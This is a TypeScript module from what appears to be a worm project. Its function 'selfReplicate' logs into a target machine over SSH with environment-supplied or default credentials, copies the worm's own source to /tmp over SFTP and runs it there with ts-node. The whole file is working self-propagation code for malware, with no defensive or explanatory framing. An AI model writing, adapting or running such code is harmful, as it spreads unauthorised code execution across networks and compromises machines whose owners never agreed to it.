
import { Target } from '../../types/index.ts';
import { logger } from '../utils/logger.ts';
import { Client } from 'ssh2';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

export const selfReplicate = (target: Target): Promise<void> => {
    return new Promise((resolve, reject) => {
        logger.info(`Module [Replicate]: Initiating self-replication sequence to ${target.ip}...`);
        
        const conn = new Client();
        const timeout = 10000;

        const timer = setTimeout(() => {
            conn.end();
            reject(new Error(`Replication to ${target.ip} timed out after ${timeout / 1000}s`));
        }, timeout);

        conn.on('ready', () => {
            logger.info(`Module [Replicate]: SSH connection established with ${target.ip}.`);
            
            conn.sftp((err, sftp) => {
                if (err) {
                    clearTimeout(timer);
                    conn.end();
                    return reject(err);
                }

                const localPayloadPath = path.join(__dirname, '../worm.ts');
                const remotePayloadPath = `/tmp/worm_payload.ts`;
                
                logger.info(`Module [Replicate]: Using SFTP to copy payload to ${target.ip}:${remotePayloadPath}`);

                const readStream = fs.createReadStream(localPayloadPath);
                const writeStream = sftp.createWriteStream(remotePayloadPath);
                
                writeStream.on('close', () => {
                   logger.info(`Module [Replicate]: Payload transfer complete.`);
                   logger.info(`Module [Replicate]: Executing payload remotely on ${target.ip}...`);

                   conn.exec(`ts-node ${remotePayloadPath}`, (err, stream) => {
                       if (err) {
                           clearTimeout(timer);
                           conn.end();
                           return reject(err);
                       }
                       stream.on('close', () => {
                           logger.info(`Module [Replicate]: Remote execution finished. Replication successful.`);
                           clearTimeout(timer);
                           conn.end();
                           resolve();
                       }).on('data', (data: Buffer) => {
                           logger.info(`[REMOTE:${target.ip}] STDOUT: ${data.toString().trim()}`);
                       }).stderr.on('data', (data: Buffer) => {
                           logger.warn(`[REMOTE:${target.ip}] STDERR: ${data.toString().trim()}`);
                       });
                   });
                });
                
                writeStream.on('error', (sftpErr) => {
                    clearTimeout(timer);
                    conn.end();
                    reject(sftpErr);
                });

                readStream.pipe(writeStream);
            });

        }).on('error', (connErr) => {
            clearTimeout(timer);
            reject(connErr);
        }).connect({
            host: target.ip,
            port: target.ports.includes(22) ? 22 : target.ports[0],
            username: process.env.SSH_USER || 'testuser',
            password: process.env.SSH_PASS || 'password'
        });
    });
};